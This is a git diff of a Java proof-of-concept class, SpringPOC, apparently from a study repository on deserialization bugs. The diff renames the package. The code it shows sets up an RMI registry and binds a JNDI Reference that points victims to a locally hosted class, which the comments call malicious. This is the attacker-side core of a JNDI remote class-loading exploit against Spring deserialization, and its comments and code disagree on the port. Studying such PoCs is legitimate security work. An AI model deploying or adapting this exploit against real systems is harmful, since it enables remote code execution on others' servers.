@@ -1,4 +1,4 @@
-package com.github.ruanshengwei.javalang.serialization.deserialization.bug;
+package com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring;
 
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 import com.sun.net.httpserver.HttpServer;
@@ -11,6 +11,10 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.rmi.registry.LocateRegistry;
 import java.rmi.registry.Registry;
+
+/**
+ * spring  poc 测试
+ */
 
 public class SpringPOC {
 
@@ -35,8 +39,8 @@ public class SpringPOC {
         System.out.println("Creating RMI Registry");
         Registry registry = LocateRegistry.createRegistry(1999);
         // 设置code url 这里即为http://http://127.0.0.1:8000/
-        // 最终下载恶意类的地址为http://127.0.0.1:8000/com.github.ruanshengwei.javalang.serialization.deserialization.bug.ExportObject.class
-        Reference reference = new Reference("com.github.ruanshengwei.javalang.serialization.deserialization.bug.ExportObject", "com.github.ruanshengwei.javalang.serialization.deserialization.bug.ExportObject", "http://127.0.0.1:8001/");
+        // 最终下载恶意类的地址为http://127.0.0.1:8000/com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject.class
+        Reference reference = new Reference("com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "com.github.ruanshengwei.javalang.serialization.deserialization.bug.spring.ExportObject", "http://127.0.0.1:8001/");
         // Reference包装类
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
         registry.bind("Object", referenceWrapper);
